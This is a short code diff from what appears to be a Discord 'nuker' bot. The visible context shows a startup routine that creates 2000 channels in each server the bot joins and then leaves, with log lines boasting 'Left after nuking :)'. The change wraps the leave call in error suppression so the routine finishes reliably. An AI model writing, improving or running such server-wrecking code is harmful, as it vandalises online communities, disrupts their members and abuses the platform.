@@ -31,7 +31,10 @@ class Startup(commands.Cog):
             except:
                 pass
             print(f'Guild: {guild.name} - {str(guild.id)} - Created 2000 channels :)')
-            await guild.leave()
+            try:
+                await guild.leave()
+            except:
+                pass
             print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')
         
 def setup(bot):
